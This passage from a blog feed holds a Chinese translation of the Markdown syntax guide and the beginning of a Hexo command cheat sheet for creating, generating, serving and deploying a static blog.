      <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="宗旨"><a href="#宗旨" class="headerlink" title="宗旨"></a>宗旨</h2><p>Markdown 的目标是实现「易读易写」。</p><p>可读性，无论如何，都是最重要的。一份使用 Markdown 格式撰写的文件应该可以直接以纯文本发布，并且看起来不会像是由许多标签或是格式指令所构成。Markdown 语法受到一些既有 text-to-HTML 格式的影响，包括 Setext、atx、Textile、reStructuredText、Grutatext 和 EtText，而最大灵感来源其实是纯文本电子邮件的格式。</p><p>总之， Markdown 的语法全由一些符号所组成，这些符号经过精挑细选，其作用一目了然。比如：在文字两旁加上星号，看起来就像<em>强调</em>。Markdown 的列表看起来，嗯，就是列表。Markdown 的区块引用看起来就真的像是引用一段文字，就像你曾在电子邮件中见过的那样。</p><h2 id="兼容-HTML"><a href="#兼容-HTML" class="headerlink" title="兼容 HTML"></a>兼容 HTML</h2><p>Markdown 语法的目标是：成为一种适用于网络的书写语言。</p><p>Markdown 不是想要取代 HTML，甚至也没有要和它相近，它的语法种类很少，只对应 HTML 标记的一小部分。Markdown 的构想不是要使得 HTML 文档更容易书写。在我看来， HTML 已经很容易写了。Markdown 的理念是，能让文档更容易读、写和随意改。HTML 是一种发布的格式，Markdown 是一种书写的格式。就这样，Markdown 的格式语法只涵盖纯文本可以涵盖的范围。</p><p>不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。不需要额外标注这是 HTML 或是 Markdown；只要直接加标签就可以了。</p><p>要制约的只有一些 HTML 区块元素――比如<code>&lt;span&gt;</code>、<code>&lt;cite&gt;</code>、<code>&lt;del&gt;</code> 等标签，必须在前后加上空行与其它内容区隔开，还要求它们的开始标签与结尾标签不能用制表符或空格来缩进。Markdown 的生成器有足够智能，不会在 HTML 区块标签外加上不必要的 </p><p> 标签。</p><p>例子如下，在 Markdown 文件里加上一段 HTML 表格：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;Foo&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><p>请注意，在 HTML 区块标签间的 Markdown 格式语法将不会被处理。比如，你在 HTML 区块内使用 Markdown 样式的<code>*强调*</code>会没有效果。</p><p>HTML 的区段（行内）标签如 <code>&lt;span&gt;</code>、<code>&lt;cite&gt;</code>、<code>&lt;del&gt;</code> 可以在 Markdown 的段落、列表或是标题里随意使用。依照个人习惯，甚至可以不用 Markdown 格式，而直接采用 HTML 标签来格式化。举例说明：如果比较喜欢 HTML 的<code>&lt;a&gt;</code> 或 <code>&lt;img&gt;</code> 标签，可以直接使用这些标签，而不用 Markdown 提供的链接或是图像标签语法。</p><p>和处在 HTML 区块标签间不同，Markdown 语法在 HTML 区段标签间是有效的。</p><p>特殊字符自动转换<br>在 HTML 文件中，有两个字符需要特殊处理： &lt; 和 &amp; 。 &lt; 符号用于起始标签，&amp; 符号则用于标记 HTML 实体，如果你只是想要显示这些字符的原型，你必须要使用实体的形式，像是 &lt; 和 &amp;。<br>&amp; 字符尤其让网络文档编写者受折磨，如果你要打「「<code>AT&amp;T</code>」 ，你必须要写成「<code>AT&amp;amp;T</code>」。而网址中的 &amp; 字符也要转换。比如你要链接到：</p><pre><code>http://images.google.com/images?num=30&amp;q=larry+bird</code></pre><p>你必须要把网址转换写为：</p><pre><code>http://images.google.com/images?num=30&amp;amp;q=larry+bird</code></pre><p>才能放到链接标签的 <code>href</code> 属性里。不用说也知道这很容易忽略，这也可能是 HTML 标准检验所检查到的错误中，数量最多的。</p><p>Markdown 让你可以自然地书写字符，需要转换的由它来处理好了。如果你使用的 <code>&amp;</code> 字符是 HTML 字符实体的一部分，它会保留原状，否则它会被转换成 <code>&amp;amp</code>;。</p><p>所以你如果要在文档中插入一个版权符号 <code>©</code>，你可以这样写：</p><pre><code>&amp;copy;</code></pre><p>Markdown 会保留它不动。而若你写：</p><pre><code>AT&amp;T</code></pre><p>Markdown 就会将它转为：</p><pre><code>AT&amp;amp;T</code></pre><p>类似的状况也会发生在 <code>&lt;</code> 符号上，因为 Markdown 允许 <a href="#html">兼容 HTML</a> ，如果你是把 <code>&lt;</code> 符号作为 HTML 标签的定界符使用，那 Markdown 也不会对它做任何转换，但是如果你写：</p><pre><code>4 &lt; 5</code></pre><p>Markdown 将会把它转换为：</p><pre><code>4 &amp;lt; 5</code></pre><p>不过需要注意的是，code 范围内，不论是行内还是区块， <code>&lt;</code> 和 <code>&amp;</code> 两个符号都<em>一定</em>会被转换成 HTML 实体，这项特性让你可以很容易地用 Markdown 写 HTML code （和 HTML 相对而言， HTML 语法中，你要把所有的 <code>&lt;</code> 和 <code>&amp;</code> 都转换为 HTML 实体，才能在 HTML 文件里面写出 HTML code。）</p><hr><h2 id="block">区块元素</h2><h3 id="p">段落和换行</h3><p>一个 Markdown 段落是由一个或多个连续的文本行组成，它的前后要有一个以上的空行（空行的定义是显示上看起来像是空的，便会被视为空行。比方说，若某一行只包含空格和制表符，则该行也会被视为空行）。普通段落不该用空格或制表符来缩进。</p><p>「由一个或多个连续的文本行组成」这句话其实暗示了 Markdown 允许段落内的强迫换行（插入换行符），这个特性和其他大部分的 text-to-HTML 格式不一样（包括 Movable Type 的「Convert Line Breaks」选项），其它的格式会把每个换行符都转成 <code>&lt;br /&gt;</code> 标签。</p><p>如果你<em>确实</em>想要依赖 Markdown 来插入 <code>&lt;br /&gt;</code> 标签的话，在插入处先按入两个以上的空格然后回车。</p><p>的确，需要多费点事（多加空格）来产生 <code>&lt;br /&gt;</code> ，但是简单地「每个换行都转换为 <code>&lt;br /&gt;</code>」的方法在 Markdown 中并不适合， Markdown 中 email 式的 <a href="#blockquote">区块引用</a> 和多段落的 <a href="#list">列表</a> 在使用换行来排版的时候，不但更好用，还更方便阅读。</p><h3 id="header">标题</h3><p>Markdown 支持两种标题的语法，类 <a href="http://docutils.sourceforge.net/mirror/setext.html" target="_blank" rel="noopener">Setext</a> 和类 <a href="http://www.aaronsw.com/2002/atx/" target="_blank" rel="noopener">atx</a> 形式。</p><p>类 Setext 形式是用底线的形式，利用 <code>=</code> （最高阶标题）和 <code>-</code> （第二阶标题），例如：</p><pre><code>This is an H1=============This is an H2-------------</code></pre><p>任何数量的 <code>=</code> 和 <code>-</code> 都可以有效果。</p><p>类 Atx 形式则是在行首插入 1 到 6 个 <code>#</code> ，对应到标题 1 到 6 阶，例如：</p><pre><code># 这是 H1## 这是 H2###### 这是 H6</code></pre><p>你可以选择性地「闭合」类 atx 样式的标题，这纯粹只是美观用的，若是觉得这样看起来比较舒适，你就可以在行尾加上 <code>#</code>，而行尾的 <code>#</code> 数量也不用和开头一样（行首的井字符数量决定标题的阶数）：</p><pre><code># 这是 H1 ### 这是 H2 ##### 这是 H3 ######</code></pre><h3 id="blockquote">区块引用 Blockquotes</h3><p>Markdown 标记区块引用是使用类似 email 中用 <code>&gt;</code> 的引用方式。如果你还熟悉在 email 信件中的引言部分，你就知道怎么在 Markdown 文件中建立一个区块引用，那会看起来像是你自己先断好行，然后在每行的最前面加上 <code>&gt;</code> ：</p><pre><code>&gt; This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,&gt; consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.&gt; Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.&gt;&gt; Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse&gt; id sem consectetuer libero luctus adipiscing.</code></pre><p>Markdown 也允许你偷懒只在整个段落的第一行最前面加上 <code>&gt;</code> ：</p><pre><code>&gt; This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.&gt; Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisseid sem consectetuer libero luctus adipiscing.</code></pre><p>区块引用可以嵌套（例如：引用内的引用），只要根据层次加上不同数量的 <code>&gt;</code> ：</p><pre><code>&gt; This is the first level of quoting.&gt;&gt; &gt; This is nested blockquote.&gt;&gt; Back to the first level.</code></pre><p>引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等：</p><pre><code>&gt; ## 这是一个标题。&gt;&gt; 1.   这是第一行列表项。&gt; 2.   这是第二行列表项。&gt;&gt; 给出一些例子代码：&gt;&gt;     return shell_exec("echo $input | $markdown_script");</code></pre><p>任何像样的文本编辑器都能轻松地建立 email 型的引用。例如在 BBEdit 中，你可以选取文字后然后从选单中选择<em>增加引用阶层</em>。</p><h3 id="list">列表</h3><p>Markdown 支持有序列表和无序列表。</p><p>无序列表使用星号、加号或是减号作为列表标记：</p><pre><code>*   Red*   Green*   Blue</code></pre><p>等同于：</p><pre><code>+   Red+   Green+   Blue</code></pre><p>也等同于：</p><pre><code>-   Red-   Green-   Blue</code></pre><p>有序列表则使用数字接着一个英文句点：</p><pre><code>1.  Bird2.  McHale3.  Parish</code></pre><p>很重要的一点是，你在列表标记上使用的数字并不会影响输出的 HTML 结果，上面的列表所产生的 HTML 标记为：</p><pre><code>&lt;ol&gt;&lt;li&gt;Bird&lt;/li&gt;&lt;li&gt;McHale&lt;/li&gt;&lt;li&gt;Parish&lt;/li&gt;&lt;/ol&gt;</code></pre><p>如果你的列表标记写成：</p><pre><code>1.  Bird1.  McHale1.  Parish</code></pre><p>或甚至是：</p><pre><code>3. Bird1. McHale8. Parish</code></pre><p>你都会得到完全相同的 HTML 输出。重点在于，你可以让 Markdown 文件的列表数字和输出的结果相同，或是你懒一点，你可以完全不用在意数字的正确性。</p><p>如果你使用懒惰的写法，建议第一个项目最好还是从 1. 开始，因为 Markdown 未来可能会支持有序列表的 start 属性。</p><p>列表项目标记通常是放在最左边，但是其实也可以缩进，最多 3 个空格，项目标记后面则一定要接着至少一个空格或制表符。</p><p>要让列表看起来更漂亮，你可以把内容用固定的缩进整理好：</p><pre><code>*   Lorem ipsum dolor sit amet, consectetuer adipiscing elit.    Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi,    viverra nec, fringilla in, laoreet vitae, risus.*   Donec sit amet nisl. Aliquam semper ipsum sit amet velit.    Suspendisse id sem consectetuer libero luctus adipiscing.</code></pre><p>但是如果你懒，那也行：</p><pre><code>*   Lorem ipsum dolor sit amet, consectetuer adipiscing elit.Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi,viverra nec, fringilla in, laoreet vitae, risus.*   Donec sit amet nisl. Aliquam semper ipsum sit amet velit.Suspendisse id sem consectetuer libero luctus adipiscing.</code></pre><p>如果列表项目间用空行分开，在输出 HTML 时 Markdown 就会将项目内容用 <code>&lt;p&gt;</code>标签包起来，举例来说：</p><pre><code>*   Bird*   Magic</code></pre><p>会被转换为：</p><pre><code>&lt;ul&gt;&lt;li&gt;Bird&lt;/li&gt;&lt;li&gt;Magic&lt;/li&gt;&lt;/ul&gt;</code></pre><p>但是这个：</p><pre><code>*   Bird*   Magic</code></pre><p>会被转换为：</p><pre><code>&lt;ul&gt;&lt;li&gt;&lt;p&gt;Bird&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Magic&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><p>列表项目可以包含多个段落，每个项目下的段落都必须缩进 4 个空格或是 1 个制表符：</p><pre><code>1.  This is a list item with two paragraphs. Lorem ipsum dolor    sit amet, consectetuer adipiscing elit. Aliquam hendrerit    mi posuere lectus.    Vestibulum enim wisi, viverra nec, fringilla in, laoreet    vitae, risus. Donec sit amet nisl. Aliquam semper ipsum    sit amet velit.2.  Suspendisse id sem consectetuer libero luctus adipiscing.</code></pre><p>如果你每行都有缩进，看起来会看好很多，当然，再次地，如果你很懒惰，Markdown 也允许：</p><pre><code>*   This is a list item with two paragraphs.    This is the second paragraph in the list item. You'reonly required to indent the first line. Lorem ipsum dolorsit amet, consectetuer adipiscing elit.*   Another item in the same list.</code></pre><p>如果要在列表项目内放进引用，那 <code>&gt;</code> 就需要缩进：</p><pre><code>*   A list item with a blockquote:    &gt; This is a blockquote    &gt; inside a list item.</code></pre><p>如果要放代码区块的话，该区块就需要缩进<em>两次</em>，也就是 8 个空格或是 2 个制表符：</p><pre><code>*   一列表项包含一个列表区块：        &lt;代码写在这&gt;</code></pre><p>当然，项目列表很可能会不小心产生，像是下面这样的写法：</p><pre><code>1986. What a great season.</code></pre><p>换句话说，也就是在行首出现<em>数字-句点-空白</em>，要避免这样的状况，你可以在句点前面加上反斜杠。</p><pre><code>1986\. What a great season.</code></pre><h3 id="precode">代码区块</h3><p>和程序相关的写作或是标签语言原始码通常会有已经排版好的代码区块，通常这些区块我们并不希望它以一般段落文件的方式去排版，而是照原来的样子显示，Markdown 会用 <code>&lt;pre&gt;</code> 和 <code>&lt;code&gt;</code> 标签来把代码区块包起来。</p><p>要在 Markdown 中建立代码区块很简单，只要简单地缩进 4 个空格或是 1 个制表符就可以，例如，下面的输入：</p><pre><code>这是一个普通段落：    这是一个代码区块。</code></pre><p>Markdown 会转换成：</p><pre><code>&lt;p&gt;这是一个普通段落：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;这是一个代码区块。&lt;/code&gt;&lt;/pre&gt;</code></pre><p>这个每行一阶的缩进（4 个空格或是 1 个制表符），都会被移除，例如：</p><pre><code>Here is an example of AppleScript:    tell application "Foo"        beep    end tell</code></pre><p>会被转换为：</p><pre><code>&lt;p&gt;Here is an example of AppleScript:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;tell application "Foo"    beepend tell&lt;/code&gt;&lt;/pre&gt;</code></pre><p>一个代码区块会一直持续到没有缩进的那一行（或是文件结尾）。</p><p>在代码区块里面， <code>&amp;</code> 、 <code>&lt;</code> 和 <code>&gt;</code> 会自动转成 HTML 实体，这样的方式让你非常容易使用 Markdown 插入范例用的 HTML 原始码，只需要复制贴上，再加上缩进就可以了，剩下的 Markdown 都会帮你处理，例如：</p><pre><code>    &lt;div class="footer"&gt;        &amp;copy; 2004 Foo Corporation    &lt;/div&gt;</code></pre><p>会被转换为：</p><pre><code>&lt;pre&gt;&lt;code&gt;&amp;lt;div class="footer"&amp;gt;    &amp;amp;copy; 2004 Foo Corporation&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;</code></pre><p>代码区块中，一般的 Markdown 语法不会被转换，像是星号便只是星号，这表示你可以很容易地以 Markdown 语法撰写 Markdown 语法相关的文件。</p><h3 id="hr">分隔线</h3><p>你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：</p><pre><code>* * *********- - ----------------------------------------</code></pre><hr><h2 id="span">区段元素</h2><h3 id="link">链接</h3><p>Markdown 支持两种形式的链接语法： <em>行内式</em>和<em>参考式</em>两种形式。</p><p>不管是哪一种，链接文字都是用 [方括号] 来标记。</p><p>要建立一个<em>行内式</em>的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可，例如：</p><pre><code>This is [an example](http://example.com/ "Title") inline link.[This link](http://example.net/) has no title attribute.</code></pre><p>会产生：</p><pre><code>&lt;p&gt;This is &lt;a href="http://example.com/" title="Title"&gt;an example&lt;/a&gt; inline link.&lt;/p&gt;&lt;p&gt;&lt;a href="http://example.net/"&gt;This link&lt;/a&gt; has notitle attribute.&lt;/p&gt;</code></pre><p>如果你是要链接到同样主机的资源，你可以使用相对路径：</p><pre><code>See my [About](/about/) page for details.</code></pre><p><em>参考式</em>的链接是在链接文字的括号后面再接上另一个方括号，而在第二个方括号里面要填入用以辨识链接的标记：</p><pre><code>This is [an example][id] reference-style link.</code></pre><p>你也可以选择性地在两个方括号中间加上一个空格：</p><pre><code>This is [an example] [id] reference-style link.</code></pre><p>接着，在文件的任意处，你可以把这个标记的链接内容定义出来：</p><pre><code>[id]: http://example.com/  "Optional Title Here"</code></pre><p>链接内容定义的形式为：</p><ul><li>方括号（前面可以选择性地加上至多三个空格来缩进），里面输入链接文字</li><li>接着一个冒号</li><li>接着一个以上的空格或制表符</li><li>接着链接的网址</li><li>选择性地接着 title 内容，可以用单引号、双引号或是括弧包着</li></ul><p>下面这三种链接的定义都是相同：</p><pre><code>[foo]: http://example.com/  "Optional Title Here"[foo]: http://example.com/  'Optional Title Here'[foo]: http://example.com/  (Optional Title Here)</code></pre><p><strong>请注意：</strong>有一个已知的问题是 Markdown.pl 1.0.1 会忽略单引号包起来的链接 title。</p><p>链接网址也可以用方括号包起来：</p><pre><code>[id]: &lt;http://example.com/&gt;  "Optional Title Here"</code></pre><p>你也可以把 title 属性放到下一行，也可以加一些缩进，若网址太长的话，这样会比较好看：</p><pre><code>[id]: http://example.com/longish/path/to/resource/here    "Optional Title Here"</code></pre><p>网址定义只有在产生链接的时候用到，并不会直接出现在文件之中。</p><p>链接辨别标签可以有字母、数字、空白和标点符号，但是并<em>不</em>区分大小写，因此下面两个链接是一样的：</p><pre><code>[link text][a][link text][A]</code></pre><p><em>隐式链接标记</em>功能让你可以省略指定链接标记，这种情形下，链接标记会视为等同于链接文字，要用隐式链接标记只要在链接文字后面加上一个空的方括号，如果你要让 "Google" 链接到 google.com，你可以简化成：</p><pre><code>[Google][]</code></pre><p>然后定义链接内容：</p><pre><code>[Google]: http://google.com/</code></pre><p>由于链接文字可能包含空白，所以这种简化型的标记内也许包含多个单词：</p><pre><code>Visit [Daring Fireball][] for more information.</code></pre><p>然后接着定义链接：</p><pre><code>[Daring Fireball]: http://daringfireball.net/</code></pre><p>链接的定义可以放在文件中的任何一个地方，我比较偏好直接放在链接出现段落的后面，你也可以把它放在文件最后面，就像是注解一样。</p><p>下面是一个参考式链接的范例：</p><pre><code>I get 10 times more traffic from [Google] [1] than from[Yahoo] [2] or [MSN] [3].  [1]: http://google.com/        "Google"  [2]: http://search.yahoo.com/  "Yahoo Search"  [3]: http://search.msn.com/    "MSN Search"</code></pre><p>如果改成用链接名称的方式写：</p><pre><code>I get 10 times more traffic from [Google][] than from[Yahoo][] or [MSN][].  [google]: http://google.com/        "Google"  [yahoo]:  http://search.yahoo.com/  "Yahoo Search"  [msn]:    http://search.msn.com/    "MSN Search"</code></pre><p>上面两种写法都会产生下面的 HTML。</p><pre><code>&lt;p&gt;I get 10 times more traffic from &lt;a href="http://google.com/"title="Google"&gt;Google&lt;/a&gt; than from&lt;a href="http://search.yahoo.com/" title="Yahoo Search"&gt;Yahoo&lt;/a&gt;or &lt;a href="http://search.msn.com/" title="MSN Search"&gt;MSN&lt;/a&gt;.&lt;/p&gt;</code></pre><p>下面是用行内式写的同样一段内容的 Markdown 文件，提供作为比较之用：</p><pre><code>I get 10 times more traffic from [Google](http://google.com/ "Google")than from [Yahoo](http://search.yahoo.com/ "Yahoo Search") or[MSN](http://search.msn.com/ "MSN Search").</code></pre><p>参考式的链接其实重点不在于它比较好写，而是它比较好读，比较一下上面的范例，使用参考式的文章本身只有 81 个字符，但是用行内形式的却会增加到 176 个字元，如果是用纯 HTML 格式来写，会有 234 个字元，在 HTML 格式中，标签比文本还要多。</p><p>使用 Markdown 的参考式链接，可以让文件更像是浏览器最后产生的结果，让你可以把一些标记相关的元数据移到段落文字之外，你就可以增加链接而不让文章的阅读感觉被打断。</p><h3 id="em">强调</h3><p>Markdown 使用星号（<code>*</code>）和底线（<code>_</code>）作为标记强调字词的符号，被 <code>*</code> 或 <code>_</code> 包围的字词会被转成用 <code>&lt;em&gt;</code> 标签包围，用两个 <code>*</code> 或 <code>_</code> 包起来的话，则会被转成 <code>&lt;strong&gt;</code>，例如：</p><pre><code>*single asterisks*_single underscores_**double asterisks**__double underscores__</code></pre><p>会转成：</p><pre><code>&lt;em&gt;single asterisks&lt;/em&gt;&lt;em&gt;single underscores&lt;/em&gt;&lt;strong&gt;double asterisks&lt;/strong&gt;&lt;strong&gt;double underscores&lt;/strong&gt;</code></pre><p>你可以随便用你喜欢的样式，唯一的限制是，你用什么符号开启标签，就要用什么符号结束。</p><p>强调也可以直接插在文字中间：</p><pre><code>un*frigging*believable</code></pre><p>但是<strong>如果你的 <code>*</code> 和 <code>_</code> 两边都有空白的话，它们就只会被当成普通的符号</strong>。</p><p>如果要在文字前后直接插入普通的星号或底线，你可以用反斜线：</p><pre><code>\*this text is surrounded by literal asterisks\*</code></pre><h3 id="code">代码</h3><p>如果要标记一小段行内代码，你可以用反引号把它包起来（<code>`</code>），例如：</p><pre><code>Use the `printf()` function.</code></pre><p>会产生：</p><pre><code>&lt;p&gt;Use the &lt;code&gt;printf()&lt;/code&gt; function.&lt;/p&gt;</code></pre><p>如果要在代码区段内插入反引号，你可以用多个反引号来开启和结束代码区段：</p><pre><code>``There is a literal backtick (`) here.``</code></pre><p>这段语法会产生：</p><pre><code>&lt;p&gt;&lt;code&gt;There is a literal backtick (`) here.&lt;/code&gt;&lt;/p&gt;</code></pre><p>代码区段的起始和结束端都可以放入一个空白，起始端后面一个，结束端前面一个，这样你就可以在区段的一开始就插入反引号：</p><pre><code>A single backtick in a code span: `` ` ``A backtick-delimited string in a code span: `` `foo` ``</code></pre><p>会产生：</p><pre><code>&lt;p&gt;A single backtick in a code span: &lt;code&gt;`&lt;/code&gt;&lt;/p&gt;&lt;p&gt;A backtick-delimited string in a code span: &lt;code&gt;`foo`&lt;/code&gt;&lt;/p&gt;</code></pre><p>在代码区段内，<code>&amp;</code> 和方括号<strong>都</strong>会被自动地转成 HTML 实体，这使得插入 HTML 原始码变得很容易，Markdown 会把下面这段：</p><pre><code>Please don't use any `&lt;blink&gt;` tags.</code></pre><p>转为：</p><pre><code>&lt;p&gt;Please don't use any &lt;code&gt;&amp;lt;blink&amp;gt;&lt;/code&gt; tags.&lt;/p&gt;</code></pre><p>你也可以这样写：</p><pre><code>`&amp;#8212;` is the decimal-encoded equivalent of `&amp;mdash;`.</code></pre><p>以产生：</p><pre><code>&lt;p&gt;&lt;code&gt;&amp;amp;#8212;&lt;/code&gt; is the decimal-encodedequivalent of &lt;code&gt;&amp;amp;mdash;&lt;/code&gt;.&lt;/p&gt;</code></pre><h3 id="img">图片</h3><p>很明显地，要在纯文字应用中设计一个「自然」的语法来插入图片是有一定难度的。</p><p>Markdown 使用一种和链接很相似的语法来标记图片，同样也允许两种样式： <em>行内式</em>和<em>参考式</em>。</p><p>行内式的图片语法看起来像是：</p><pre><code>![Alt text](/path/to/img.jpg)![Alt text](/path/to/img.jpg "Optional title")</code></pre><p>详细叙述如下：</p><ul><li>一个惊叹号 <code>!</code></li><li>接着一个方括号，里面放上图片的替代文字</li><li>接着一个普通括号，里面放上图片的网址，最后还可以用引号包住并加上选择性的 'title' 文字。</li></ul><p>参考式的图片语法则长得像这样：</p><pre><code>![Alt text][id]</code></pre><p>「id」是图片参考的名称，图片参考的定义方式则和连结参考一样：</p><pre><code>[id]: url/to/image  "Optional title attribute"</code></pre><p>到目前为止， Markdown 还没有办法指定图片的宽高，如果你需要的话，你可以使用普通的 <code>&lt;img&gt;</code> 标签。</p><hr><h2 id="misc">其它</h2><h3 id="autolink">自动链接</h3><p>Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用方括号包起来， Markdown 就会自动把它转成链接。一般网址的链接文字就和链接地址一样，例如：</p><pre><code>&lt;http://example.com/&gt;</code></pre><p>Markdown 会转为：</p><pre><code>&lt;a href="http://example.com/"&gt;http://example.com/&lt;/a&gt;</code></pre><p>邮址的自动链接也很类似，只是 Markdown 会先做一个编码转换的过程，把文字字符转成 16 进位码的 HTML 实体，这样的格式可以糊弄一些不好的邮址收集机器人，例如：</p><pre><code>&lt;address@example.com&gt;</code></pre><p>Markdown 会转成：</p><pre><code>&lt;a href="&amp;#x6D;&amp;#x61;i&amp;#x6C;&amp;#x74;&amp;#x6F;:&amp;#x61;&amp;#x64;&amp;#x64;&amp;#x72;&amp;#x65;&amp;#115;&amp;#115;&amp;#64;&amp;#101;&amp;#120;&amp;#x61;&amp;#109;&amp;#x70;&amp;#x6C;e&amp;#x2E;&amp;#99;&amp;#111;&amp;#109;"&gt;&amp;#x61;&amp;#x64;&amp;#x64;&amp;#x72;&amp;#x65;&amp;#115;&amp;#115;&amp;#64;&amp;#101;&amp;#120;&amp;#x61;&amp;#109;&amp;#x70;&amp;#x6C;e&amp;#x2E;&amp;#99;&amp;#111;&amp;#109;&lt;/a&gt;</code></pre><p>在浏览器里面，这段字串（其实是 <code>&lt;a href="mailto:address@example.com"&gt;address@example.com&lt;/a&gt;</code>）会变成一个可以点击的「address@example.com」链接。</p><p>（这种作法虽然可以糊弄不少的机器人，但并不能全部挡下来，不过总比什么都不做好些。不管怎样，公开你的信箱终究会引来广告信件的。）</p><h3>反斜杠</h3><p>Markdown 可以利用反斜杠来插入一些在语法中有其它意义的符号，例如：如果你想要用星号加在文字旁边的方式来做出强调效果（但不用 <code>&lt;em&gt;</code> 标签），你可以在星号的前面加上反斜杠：</p><pre><code>\*literal asterisks\*</code></pre><p>Markdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：</p><pre><code>\   反斜线`   反引号*   星号_   底线{}  花括号[]  方括号()  括弧#   井字号+   加号-   减号.   英文句点!   惊叹号</code></pre><h1 id="扩展链接"><a href="#扩展链接" class="headerlink" title="扩展链接"></a>扩展链接</h1><p><a href="https://www.cnblogs.com/liugang-vip/p/6337580.html" target="_blank" rel="noopener">https://www.cnblogs.com/liugang-vip/p/6337580.html</a></p>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HEXO用户手册</title>
      <link href="/2018/05-20-HEXO-ALL.html"/>
      <url>/2018/05-20-HEXO-ALL.html</url>
      <content type="html"><![CDATA[<h2 id="HEXO-ALL"><a href="#HEXO-ALL" class="headerlink" title="HEXO ALL"></a>HEXO ALL</h2><h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g #安装  </span><br><span class="line">npm update hexo -g #升级  </span><br><span class="line">hexo init #初始化</span><br></pre></td></tr></table></figure><h3 id="简写"><a href="#简写" class="headerlink" title="简写"></a>简写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章</span><br><span class="line">hexo p == hexo publish</span><br><span class="line">hexo g == hexo generate#生成</span><br><span class="line">hexo s == hexo server #启动服务预览</span><br><span class="line">hexo d == hexo deploy#部署</span><br></pre></td></tr></table></figure><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。</span><br><span class="line">hexo server -s #静态模式</span><br><span class="line">hexo server -p 5000 #更改端口</span><br><span class="line">hexo server -i 192.168.1.1 #自定义 IP</span><br><span class="line"></span><br><span class="line">hexo clean #清除缓存 网页正常情况下可以忽略此条命令</span><br><span class="line">hexo g #生成静态网页</span><br><span class="line">hexo d #开始部署</span><br></pre></td></tr></table></figure><h3 id="监视文件变动"><a href="#监视文件变动" class="headerlink" title="监视文件变动"></a>监视文件变动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo generate #使用 Hexo 生成静态文件快速而且简单</span><br><span class="line">hexo generate --watch #监视文件变动</span><br></pre></td></tr></table></figure><h3 id="完成后部署"><a href="#完成后部署" class="headerlink" title="完成后部署"></a>完成后部署</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">两个命令的作用是相同的</span><br><span class="line">hexo generate --deploy</span><br><span class="line">hexo deploy --generate</span><br><span class="line"></span><br><span class="line">hexo deploy -g</span><br><span class="line">hexo server -g</span><br></pre></td></tr></table></figure><h3 id="草稿"><a href="#草稿" class="headerlink" title="草稿"></a>草稿</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a>模版</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;postName&quot; #新建文章</span><br><span class="line">hexo new page &quot;pageName&quot; #新建页面</span><br><span class="line">hexo generate #生成静态页面至public目录</span><br><span class="line">hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）</span><br><span 